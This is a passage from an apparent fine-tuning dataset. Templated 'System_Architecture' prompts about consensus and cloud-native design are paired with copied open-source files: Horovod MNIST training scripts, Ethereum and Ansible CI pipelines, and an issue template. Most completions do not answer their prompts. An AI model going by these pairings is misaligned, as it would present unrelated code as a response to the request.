backward_passes_per_step=1, average_aggregated_gradients=True)\n\n# Horovod: Specify `experimental_run_tf_function=False` to ensure TensorFlow\n# uses hvd.DistributedOptimizer() to compute gradients.\nmodel.compile(loss=tf.losses.SparseCategoricalCrossentropy(),\n                    optimizer=opt,\n                    metrics=['accuracy'],\n                    experimental_run_tf_function=False)\n\n# Horovod: initialize optimizer state so we can synchronize across workers\n# Keras has empty optimizer variables() for TF2:\n# https://sourcegraph.com/github.com/tensorflow/tensorflow@v2.4.1/-/blob/tensorflow/python/keras/optimizer_v2/optimizer_v2.py#L351:10\nmodel.fit(dataset, steps_per_epoch=1, epochs=1, callbacks=None)\n\nstate = hvd.elastic.KerasState(model, batch=0, epoch=0)\n\ndef on_state_reset():\n    tf.keras.backend.set_value(state.model.optimizer.lr,  0.001 * hvd.size())\n    # Re-initialize, to join with possible new ranks\n    state.model.fit(dataset, steps_per_epoch=1, epochs=1, callbacks=None)\n\nstate.register_reset_callbacks([on_state_reset])\n\ncallbacks = [\n    hvd.elastic.UpdateEpochStateCallback(state),\n    hvd.elastic.UpdateBatchStateCallback(state),\n    hvd.elastic.CommitStateCallback(state),\n]\n\n# Horovod: save checkpoints only on worker 0 to prevent other workers from corrupting them.\nif hvd.rank() == 0:\n    callbacks.append(tf.keras.callbacks.ModelCheckpoint('./checkpoint-{epoch}.h5'))\n\n# Train the model.\n# Horovod: adjust number of steps based on number of GPUs.\n@hvd.elastic.run\ndef train(state):\n    state.model.fit(dataset, steps_per_epoch=500 // hvd.size(),\n                    epochs=24-state.epoch, callbacks=callbacks,\n                    verbose=1)\n\ntrain(state)\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/tensorflow2/tensorflow2_keras_mnist_elastic.py", "language": "python", "complexity": "medium", "star_count": 14555, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 114}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2020 Uber Technologies, Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\nimport sys\n\nimport tensorflow as tf\n\nimport horovod\nimport horovod.tensorflow as hvd\n\n\ndef main():\n    # Horovod: initialize Horovod.\n    hvd.init()\n\n    # Horovod: pin GPU to be used to process local rank (one GPU per process)\n    gpus = tf.config.experimental.list_physical_devices('GPU')\n    for gpu in gpus:\n        tf.config.experimental.set_memory_growth(gpu, True)\n    if gpus:\n        tf.config.experimental.set_visible_devices(gpus[hvd.local_rank()], 'GPU')\n\n    (mnist_images, mnist_labels), _ = \\\n        tf.keras.datasets.mnist.load_data(path='mnist-%d.npz' % hvd.rank())\n\n    dataset = tf.data.Dataset.from_tensor_slices(\n        (tf.cast(mnist_images[..., tf.newaxis] / 255.0, tf.float32),\n         tf.cast(mnist_labels, tf.int64))\n    )\n    dataset = dataset.repeat().shuffle(10000).batch(128)\n\n    mnist_model = tf.keras.Sequential([\n        tf.keras.layers.Conv2D(32, [3, 3], activation='relu'),\n        tf.keras.layers.Conv2D(64, [3, 3], activation='relu'),\n        tf.keras.layers.MaxPooling2D(pool_size=(2, 2)),\n        tf.keras.layers.Dropout(0.25),\n        tf.keras.layers.Flatten(),\n        tf.keras.layers.Dense(128, activation='relu'),\n        tf.keras.layers.Dropout(0.5),\n        tf.keras.layers.Dense(10, activation='softmax')\n    ])\n    loss = tf.losses.SparseCategoricalCrossentropy()\n\n    # Horovod: adjust learning rate based on number of GPUs.\n    lr = 0.001\n    opt = tf.optimizers.Adam(lr * hvd.size())\n\n    @tf.function\n    def training_step(images, labels, allreduce=True):\n        with tf.GradientTape() as tape:\n            probs = mnist_model(images, training=True)\n            loss_value = loss(labels, probs)\n\n        # Horovod: add Horovod Distributed GradientTape.\n        if allreduce:\n            tape = hvd.DistributedGradientTape(tape)\n\n        grads = tape.gradient(loss_value, mnist_model.trainable_variables)\n        opt.apply_gradients(zip(grads, mnist_model.trainable_variables))\n        return loss_value\n\n    # Horovod: initialize model and optimizer state so we can synchronize across workers\n    for batch_idx, (images, labels) in enumerate(dataset.take(1)):\n        training_step(images, labels, allreduce=False)\n\n    @hvd.elastic.run\n    def train(state):\n        start_batch = state.batch\n\n        # Horovod: adjust number of steps based on number of GPUs.\n        for batch_idx, (images, labels) in enumerate(dataset.skip(state.batch).take(100 // hvd.size())):\n            state.batch = start_batch + batch_idx\n            loss_value = training_step(images, labels)\n\n            if state.batch % 10 == 0 and hvd.rank() == 0:\n                print('Step #%d\\tLoss: %.6f' % (state.batch, loss_value))\n\n            # Horovod: commit state at the end of each batch\n            state.commit()\n\n    def on_state_reset():\n        opt.lr.assign(lr * hvd.size())\n\n    state = hvd.elastic.TensorFlowKerasState(mnist_model, opt, batch=0)\n    state.register_reset_callbacks([on_state_reset])\n\n    train(state)\n\n    checkpoint_dir = './checkpoints'\n    checkpoint = tf.train.Checkpoint(model=mnist_model, optimizer=opt)\n\n    # Horovod: save checkpoints only on worker 0 to prevent other workers from\n    # corrupting it.\n    if hvd.rank() == 0:\n        checkpoint.save(checkpoint_dir)\n\n\nif __name__ == '__main__':\n    if len(sys.argv) == 5:\n        # run training through horovod.run\n        num_proc = int(sys.argv[1])\n        min_num_proc = int(sys.argv[2])\n        max_num_proc = int(sys.argv[3])\n        hosts = sys.argv[4]\n        print('Running training through horovod.run')\n        horovod.run(main, num_proc=num_proc, min_num_proc=min_num_proc, max_num_proc=max_num_proc,\n                    hosts=hosts, use_gloo=True, verbose=2)\n    else:\n        # this is running via horovodrun\n        main()\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/tensorflow2/tensorflow2_mnist_elastic.py", "language": "python", "complexity": "medium", "star_count": 14555, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 123}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2019 Uber Technologies, Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\nimport argparse\nimport os\nimport numpy as np\nimport timeit\n\nimport tensorflow as tf\nimport horovod.tensorflow as hvd\nfrom tensorflow.keras import applications\n\n# Benchmark settings\nparser = argparse.ArgumentParser(description='TensorFlow Synthetic Benchmark',\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument('--fp16-allreduce', action='store_true', default=False,\n                    help='use fp16 compression during allreduce')\n\nparser.add_argument('--model', type=str, default='ResNet50',\n                    help='model to benchmark')\nparser.add_argument('--batch-size', type=int, default=32,\n                    help='input batch size')\n\nparser.add_argument('--num-warmup-batches', type=int, default=10,\n                    help='number of warm-up batches that don\\'t count towards benchmark')\nparser.add_argument('--num-batches-per-iter', type=int, default=10,\n                    help='number of batches per benchmark iteration')\nparser.add_argument('--num-iters', type=int, default=10,\n                    help='number of benchmark iterations')\nparser.add_argument('--num-batches-per-commit', type=int, default=1,\n                    help='number of batches per commit of the elastic state object')\n\nparser.add_argument('--no-cuda', action='store_true', default=False,\n                    help='disables CUDA training')\n\nargs = parser.parse_args()\nargs.cuda = not args.no_cuda\n\n# Horovod: initialize Horovod.\nhvd.init()\n\n# Horovod: pin GPU to be used to process local rank (one GPU per process)\nif args.cuda:\n    gpus = tf.config.experimental.list_physical_devices('GPU')\n    for gpu in gpus:\n        tf.config.experimental.set_memory_growth(gpu, True)\n    if gpus:\n        tf.config.experimental.set_visible_devices(gpus[hvd.local_rank()], 'GPU')\nelse:\n    os.environ[\"CUDA_VISIBLE_DEVICES\"] = \"-1\"\n\n# Set up standard model.\nlr = 0.01\nmodel = getattr(applications, args.model)(weights=None)\nopt = tf.optimizers.SGD(lr * hvd.size())\n\ndata = tf.random.uniform([args.batch_size, 224, 224, 3])\ntarget = tf.random.uniform([args.batch_size, 1], minval=0, maxval=999, dtype=tf.int64)\n\n\n@tf.function\ndef train_one_batch():\n    # Horovod: (optional) compression algorithm.\n    compression = hvd.Compression.fp16 if args.fp16_allreduce else hvd.Compression.none\n\n    # Horovod: use DistributedGradientTape\n    with tf.GradientTape() as tape:\n        probs = model(data, training=True)\n        loss = tf.losses.sparse_categorical_crossentropy(target, probs)\n\n    # Horovod: add Horovod Distributed GradientTape.\n    tape = hvd.DistributedGradientTape(tape, compression=compression)\n\n    gradients = tape.gradient(loss, model.trainable_variables)\n    opt.apply_gradients(zip(gradients, model.trainable_variables))\n\n\ndef benchmark_step(state):\n    train_one_batch()\n    if state is not None:\n        state.batch += 1\n        if state.batch == args.num_batches_per_commit:\n            state.batch = 0\n            state.commit()\n\n\ndef log(s, nl=True):\n    if hvd.rank() != 0:\n        return\n    print(s, end='\\n' if nl else '')\n\n\nlog('Model: %s' % args.model)\nlog('Batch size: %d' % args.batch_size)\ndevice = 'GPU' if args.cuda else 'CPU'\nlog('Number of %ss: %d' % (device, hvd.size()))\n\n\n# Run one batch to initialize weights before synchronization\ntrain_one_batch()\n\n\n@hvd.elastic.run\ndef run_benchmark(state):\n    with tf.device(device):\n        # Warm-up\n        if not state.warm:\n            log('Running warmup...')\n            timeit.timeit(lambda: benchmark_step(state), number=args.num_warmup_batches)\n            state.warm = True\n            state.commit()\n\n        # Benchmark\n        if state.iter == 0:\n            log('Running benchmark...')\n        for x in range(state.iter, args.num_iters):\n            time = timeit.timeit(lambda: benchmark_step(state), number=args.num_batches_per_iter)\n            img_sec = args.batch_size * args.num_batches_per_iter / time\n            log('Iter #%d: %.1f img/sec per %s' % (x, img_sec, device))\n            state.img_secs.append(img_sec)\n            state.iter = x\n            state.commit()\n\n\ndef on_state_reset():\n    opt.lr.assign(lr * hvd.size())\n\n\nstate = hvd.elastic.TensorFlowKerasState(model, opt, img_secs=[], iter=0, batch=0, warm=False)\nstate.register_reset_callbacks([on_state_reset])\nrun_benchmark(state)\n\n# Results\nimg_sec_mean = np.mean(state.img_secs)\nimg_sec_conf = 1.96 * np.std(state.img_secs)\nlog('Img/sec per %s: %.1f +-%.1f' % (device, img_sec_mean, img_sec_conf))\nlog('Total img/sec on %d %s(s): %.1f +-%.1f' %\n    (hvd.size(), device, hvd.size() * img_sec_mean, hvd.size() * img_sec_conf))\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": "examples/elastic/tensorflow2/tensorflow2_synthetic_benchmark_elastic.py", "language": "python", "complexity": "medium", "star_count": 14555, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 150}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Generate reference tests\n\ndefaults:\n  run:\n    shell: zsh -e {0}\n\non:\n  workflow_dispatch:\n    inputs:\n      repo:\n        description: The repository to use (e.g. user/consensus-specs)\n        default: ethereum/consensus-specs\n        type: string\n        required: true\n      ref:\n        description: The branch, tag or SHA to checkout and build from\n        default: master\n        type: string\n        required: true\n  schedule:\n    - cron:  '0 2 * * *'\n\njobs:\n  generate-tests:\n    timeout-minutes: 720  # 12 hours\n    runs-on: [self-hosted-ghr-custom, size-xl-x64, profile-consensusSpecs]\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          repository: ${{ inputs.repo }}\n          path: 'consensus-specs'\n          ref: ${{ inputs.ref }}\n      - name: Setup Python\n        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n        with:\n          python-version: '3.13'\n          cache: ''\n      - name: Generate tests\n        run: |\n          cd consensus-specs\n          set -o pipefail\n          make reftests verbose=true 2>&1 | tee ../consensustestgen.log\n          cp -r presets/ ../consensus-spec-tests/presets\n          cp -r configs/ ../consensus-spec-tests/configs\n      - name: Archive configurations\n        run: |\n          cd consensus-spec-tests\n          tar -czvf general.tar.gz tests/general\n          tar -czvf minimal.tar.gz tests/minimal\n          tar -czvf mainnet.tar.gz tests/mainnet\n      - name: Upload general.tar.gz\n        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2\n        with:\n          name: General Test Configuration\n          path: consensus-spec-tests/general.tar.gz\n      - name: Upload minimal.tar.gz\n        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2\n        with:\n          name: Minimal Test Configuration\n          path: consensus-spec-tests/minimal.tar.gz\n      - name: Upload mainnet.tar.gz\n        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2\n        with:\n          name: Mainnet Test Configuration\n          path: consensus-spec-tests/mainnet.tar.gz\n      - name: Upload consensustestgen\n        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2\n        with:\n          name: consensustestgen.log\n          path: consensustestgen.log\n", "metadata": {"source": "github.com/ethereum/consensus-specs", "file_path": ".github/workflows/generate_vectors.yml", "language": "yaml", "complexity": "simple", "star_count": 3756, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 72}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "trigger:\n  batch: true\n  branches:\n    include:\n      - devel\n      - stable-*\n\npr:\n  autoCancel: true\n  branches:\n    include:\n      - devel\n      - stable-*\n\nschedules:\n  - cron: 0 7 * * *\n    displayName: Nightly\n    always: true\n    branches:\n      include:\n        - devel\n        - stable-*\n\nvariables:\n  - name: checkoutPath\n    value: ansible\n  - name: coverageBranches\n    value: devel\n  - name: entryPoint\n    value: .azure-pipelines/commands/entry-point.sh\n  - name: fetchDepth\n    value: 500\n  - name: defaultContainer\n    value: quay.io/ansible/azure-pipelines-test-container:6.0.0\n\npool: Standard\n\nstages:\n  - stage: Sanity\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml\n        parameters:\n          nameFormat: Test {0}\n          testFormat: sanity/{0}\n          targets:\n            - test: 1\n            - test: 2\n  - stage: Units\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml\n        parameters:\n          nameFormat: Python {0}\n          testFormat: units/{0}\n          targets:\n            - test: 3.8\n            - test: 3.9\n            - test: '3.10'\n            - test: 3.11\n            - test: 3.12\n            - test: 3.13\n  - stage: Windows\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml\n        parameters:\n          nameFormat: Server {0}\n          testFormat: windows/{0}/1\n          targets:\n            - name: 2016 WinRM HTTP\n              test: 2016/winrm/http\n            - name: 2019 WinRM HTTPS\n              test: 2019/winrm/https\n            - name: 2022 WinRM HTTPS\n              test: 2022/winrm/https\n            - name: 2022 PSRP HTTP\n              test: 2022/psrp/http\n            - name: 2022 SSH Key\n              test: 2022/ssh/key\n            - name: 2025 PSRP HTTP\n              test: 2025/psrp/http\n            - name: 2025 SSH Key\n              test: 2025/ssh/key\n  - stage: Remote\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml  # context/target\n        parameters:\n          targets:\n            - name: macOS 15.3\n              test: macos/15.3\n            - name: RHEL 9.6 py39\n              test: rhel/9.6@3.9\n            - name: RHEL 9.6 py312\n              test: rhel/9.6@3.12\n            - name: RHEL 10.0\n              test: rhel/10.0\n            - name: FreeBSD 13.5\n              test: freebsd/13.5\n            - name: FreeBSD 14.3\n              test: freebsd/14.3\n          groups:\n            - 1\n            - 2\n      - template: templates/matrix.yml  # context/controller\n        parameters:\n          targets:\n            - name: macOS 15.3\n              test: macos/15.3\n            - name: RHEL 9.6\n              test: rhel/9.6\n            - name: RHEL 10.0\n              test: rhel/10.0\n            - name: FreeBSD 13.5\n              test: freebsd/13.5\n            - name: FreeBSD 14.3\n              test: freebsd/14.3\n          groups:\n            - 3\n            - 4\n            - 5\n      - template: templates/matrix.yml  # context/controller (ansible-test container management)\n        parameters:\n          targets:\n            - name: Alpine 3.21\n              test: alpine/3.21\n            - name: Fedora 41\n              test: fedora/41\n            - name: RHEL 9.6\n              test: rhel/9.6\n            - name: RHEL 10.0\n              test: rhel/10.0\n            - name: Ubuntu 24.04\n              test: ubuntu/24.04\n          groups:\n            - 6\n  - stage: Docker\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml  # context/target\n        parameters:\n          testFormat: linux/{0}\n          targets:\n            - name: Alpine 3.21\n              test: alpine321\n            - name: Fedora 41\n              test: fedora41\n            - name: Ubuntu 22.04\n              test: ubuntu2204\n            - name: Ubuntu 24.04\n              test: ubuntu2404\n          groups:\n            - 1\n            - 2\n      - template: templates/matrix.yml  # context/controller\n        parameters:\n          testFormat: linux/{0}\n          targets:\n            - name: Alpine 3.21\n              test: alpine321\n            - name: Fedora 41\n              test: fedora41\n            - name: Ubuntu 24.04\n              test: ubuntu2404\n          groups:\n            - 3\n            - 4\n            - 5\n      - template: templates/matrix.yml  # context/target (dnf-oldest, dnf-latest)\n        parameters:\n          testFormat: linux/{0}\n          targets:\n            - name: Fedora 41\n              test: fedora41\n          groups:\n            - 7\n  - stage: Galaxy\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml\n        parameters:\n          nameFormat: Python {0}\n          testFormat: galaxy/{0}/1\n          targets:\n            - test: 3.11\n            - test: 3.12\n            - test: 3.13\n  - stage: Generic\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml\n        parameters:\n          nameFormat: Python {0}\n          testFormat: generic/{0}/1\n          targets:\n            - test: 3.11\n            - test: 3.12\n            - test: 3.13\n  - stage: Incidental_Windows\n    displayName: Incidental Windows\n    dependsOn: []\n    jobs:\n      - template: templates/matrix.yml\n        parameters:\n          nameFormat: Server {0}\n          testFormat: i/windows/{0}\n          targets:\n            - name: 2016 WinRM HTTP\n              test: 2016/winrm/http\n            - name: 2019 WinRM HTTPS\n              test: 2019/winrm/https\n            - name: 2022 WinRM HTTPS\n              test: 2022/winrm/https\n            - name: 2022 PSRP HTTP\n              test: 2022/psrp/http\n            - name: 2022 SSH Key\n              test: 2022/ssh/key\n            - name: 2025 PSRP HTTP\n              test: 2025/psrp/http\n            - name: 2025 SSH Key\n              test: 2025/ssh/key\n  - stage: Summary\n    condition: succeededOrFailed()\n    dependsOn:\n      - Sanity\n      - Units\n      - Windows\n      - Remote\n      - Docker\n      - Galaxy\n      - Generic\n      - Incidental_Windows\n    jobs:\n      - template: templates/coverage.yml\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": ".azure-pipelines/azure-pipelines.yml", "language": "yaml", "complexity": "complex", "star_count": 65718, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 236}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n\"\"\"\nCombine coverage data from multiple jobs, keeping the data only from the most recent attempt from each job.\nCoverage artifacts must be named using the format: \"Coverage $(System.JobAttempt) {StableUniqueNameForEachJob}\"\nThe recommended coverage artifact name format is: Coverage $(System.JobAttempt) $(System.StageDisplayName) $(System.JobDisplayName)\nKeep in mind that Azure Pipelines does not enforce unique job display names (only names).\nIt is up to pipeline authors to avoid name collisions when deviating from the recommended format.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport os\nimport re\nimport shutil\nimport sys\n\n\ndef main():\n    \"\"\"Main program entry point.\"\"\"\n    source_directory = sys.argv[1]\n\n    if '/ansible_collections/' in os.getcwd():\n        output_path = \"tests/output\"\n    else:\n        output_path = \"test/results\"\n\n    destination_directory = os.path.join(output_path, 'coverage')\n\n    if not os.path.exists(destination_directory):\n        os.makedirs(destination_directory)\n\n    jobs = {}\n    count = 0\n\n    for name in os.listdir(source_directory):\n        match = re.search('^Coverage (?P<attempt>[0-9]+) (?P<label>.+)$', name)\n        label = match.group('label')\n        attempt = int(match.group('attempt'))\n        jobs[label] = max(attempt, jobs.get(label, 0))\n\n    for label, attempt in jobs.items():\n        name = 'Coverage {attempt} {label}'.format(label=label, attempt=attempt)\n        source = os.path.join(source_directory, name)\n        source_files = os.listdir(source)\n\n        for source_file in source_files:\n            source_path = os.path.join(source, source_file)\n            destination_path = os.path.join(destination_directory, source_file + '.' + label)\n            print('\"%s\" -> \"%s\"' % (source_path, destination_path))\n            shutil.copyfile(source_path, destination_path)\n            count += 1\n\n    print('Coverage file count: %d' % count)\n    print('##vso[task.setVariable variable=coverageFileCount]%d' % count)\n    print('##vso[task.setVariable variable=outputPath]%s' % output_path)\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": ".azure-pipelines/scripts/combine-coverage.py", "language": "python", "complexity": "simple", "star_count": 65718, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 60}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This template adds a job for processing code coverage data.\n# It will upload results to Azure Pipelines and codecov.io.\n# Use it from a job stage that completes after all other jobs have completed.\n# This can be done by placing it in a separate summary stage that runs after the test stage(s) have completed.\n\njobs:\n  - job: Coverage\n    displayName: Code Coverage\n    container: $[ variables.defaultContainer ]\n    workspace:\n      clean: all\n    steps:\n      - checkout: self\n        fetchDepth: $(fetchDepth)\n        path: $(checkoutPath)\n      - task: DownloadPipelineArtifact@2\n        displayName: Download Coverage Data\n        inputs:\n          path: coverage/\n          patterns: \"Coverage */*=coverage.combined\"\n      - bash: .azure-pipelines/scripts/combine-coverage.py coverage/\n        displayName: Combine Coverage Data\n      - bash: .azure-pipelines/scripts/report-coverage.sh\n        displayName: Generate Coverage Report\n        condition: gt(variables.coverageFileCount, 0)\n      - bash: .azure-pipelines/scripts/publish-codecov.py \"$(outputPath)\"\n        displayName: Publish to codecov.io\n        condition: gt(variables.coverageFileCount, 0)\n        continueOnError: true\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": ".azure-pipelines/templates/coverage.yml", "language": "yaml", "complexity": "simple", "star_count": 65718, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 30}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This template uses the provided list of jobs to create test one or more test jobs.\n# It can be used directly if needed, or through the matrix template.\n\nparameters:\n  # A required list of dictionaries, one per test job.\n  # Each item in the list must contain a \"job\" and \"name\" key.\n  - name: jobs\n    type: object\n\njobs:\n  - ${{ each job in parameters.jobs }}:\n    - job: test_${{ replace(replace(replace(replace(job.test, '/', '_'), '.', '_'), '-', '_'), '@', '_') }}\n      displayName: ${{ job.name }}\n      container: $[ variables.defaultContainer ]\n      workspace:\n        clean: all\n      steps:\n        - checkout: self\n          fetchDepth: $(fetchDepth)\n          path: $(checkoutPath)\n        - bash: .azure-pipelines/scripts/run-tests.sh \"$(entryPoint)\" \"${{ job.test }}\" \"$(coverageBranches)\"\n          displayName: Run Tests\n        - bash: .azure-pipelines/scripts/process-results.sh\n          condition: succeededOrFailed()\n          displayName: Process Results\n        - bash: .azure-pipelines/scripts/aggregate-coverage.sh \"$(Agent.TempDirectory)\"\n          condition: eq(variables.haveCoverageData, 'true')\n          displayName: Aggregate Coverage Data\n        - task: PublishTestResults@2\n          condition: eq(variables.haveTestResults, 'true')\n          inputs:\n            testResultsFiles: \"$(outputPath)/junit/*.xml\"\n          displayName: Publish Test Results\n        - task: PublishPipelineArtifact@1\n          condition: eq(variables.haveBotResults, 'true')\n          displayName: Publish Bot Results\n          inputs:\n            targetPath: \"$(outputPath)/bot/\"\n            artifactName: \"Bot $(System.JobAttempt) $(System.StageDisplayName) $(System.JobDisplayName)\"\n        - task: PublishPipelineArtifact@1\n          condition: eq(variables.haveCoverageData, 'true')\n          displayName: Publish Coverage Data\n          inputs:\n            targetPath: \"$(Agent.TempDirectory)/coverage/\"\n            artifactName: \"Coverage $(System.JobAttempt) $(System.StageDisplayName) $(System.JobDisplayName)\"\n", "metadata": {"source": "github.com/ansible/ansible", "file_path": ".azure-pipelines/templates/test.yml", "language": "yaml", "complexity": "simple", "star_count": 65718, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 46}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: 🐛 Bug report\ndescription: Create a report to help us improve\n\nbody:\n- type: markdown\n  attributes:\n    value: >\n      **Thank you for wanting to report a bug in ansible-core!**\n\n\n      ⚠\n      Verify first that your issue is not [already reported on\n      GitHub][issue search] and keep in mind that we may have to keep\n      the current behavior because [every change breaks someone's\n      workflow][XKCD 1172].\n      We try to be mindful about this.\n\n      Also test if the latest release and devel branch are affected too.\n\n\n      **Tip:** If you are seeking community support, please see\n      [Communicating with the Ansible community][communication] to\n      get in touch and ask questions.\n\n\n\n      [communication]:\n      https://docs.ansible.com/ansible/devel/community/communication.html\n\n      [issue search]: ../search?q=is%3Aissue&type=issues\n\n      [XKCD 1172]: https://xkcd.com/1172/\n\n\n- type: textarea\n  attributes:\n    label: Summary\n    description: Explain the problem briefly below.\n    placeholder: >-\n      When I try to do X with ansible-core from the devel branch on GitHub, Y\n      breaks in a way Z under the env E. Here are all the details I know\n      about this problem...\n  validations:\n    required: true\n\n- type: dropdown\n  attributes:\n    label: Issue Type\n    description: This is a marker for our automatic bot. Do not change it.\n    options:\n    - Bug Report\n  validations:\n    required: true\n\n- type: input\n  attributes:\n    label: Component Name\n    description: >\n      Write the short name of the rst file, module, plugin, task or\n      feature below, *use your best guess if unsure*.\n\n\n      **Tip:** Cannot find it in this repository? Please be advised that\n      the source for some parts of the documentation are hosted outside\n      of this repository. If the page you are reporting describes\n      modules/plugins/etc that are not officially supported by the\n      Ansible Core Engineering team, there is a good chance that it is\n      coming from one of the [Ansible Collections maintained by the\n      community][collections org]. If this is the case, please make sure\n      to file an issue under the appropriate project there 